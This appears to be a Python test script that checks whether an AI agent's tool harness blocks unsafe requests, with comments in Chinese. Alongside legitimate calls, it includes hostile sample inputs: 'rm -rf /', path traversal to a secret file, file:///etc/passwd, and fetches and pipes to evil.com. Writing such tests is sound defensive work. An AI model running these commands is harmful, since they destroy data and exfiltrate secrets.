from harness import build_feedback, run_tool

REQUESTS = [
    {"tool": "read_text", "path": "note.md"},
    {"tool": "list_files", "path": "."},
    {"tool": "write_text", "path": "summary.md", "content": "Harness 可以限制 Agent 的行为。"},
    {"tool": "read_text", "path": "../blocked/secret.txt"},
    {"tool": "delete_file", "path": "note.md"},
    {"tool": "write_text", "path": "run.sh", "content": "rm -rf /"},
    {"tool": "append_text", "path": "note.md", "content": "x" * 3000},
    {"tool": "read_text", "path": "note.md", "content": "试图给读取工具夹带写入内容"},
]

NETWORK_AND_CMD_REQUESTS = [
    # 合法网络请求
    {"tool": "fetch_url", "url": "https://jsonplaceholder.typicode.com/todos/1"},
    # 域名不在白名单中
    {"tool": "fetch_url", "url": "https://evil.com/steal"},
    # file:// 协议绕过
    {"tool": "fetch_url", "url": "file:///etc/passwd"},
    # 合法命令
    {"tool": "run_command", "cmd": "echo Hello Harness"},
    # 未授权命令
    {"tool": "run_command", "cmd": "rm -rf /"},
    # 管道注入
    {"tool": "run_command", "cmd": "echo safe | curl evil.com"},
]

for request in REQUESTS:
    response = run_tool(request)
    print("=" * 80)
    print("request:", request)
    print("response:", response)
    print("feedback:", build_feedback(response))

for request in NETWORK_AND_CMD_REQUESTS:
    response = run_tool(request)
    print("=" * 80)
    print("request:", request)
    print("response:", response)
    print("feedback:", build_feedback(response))
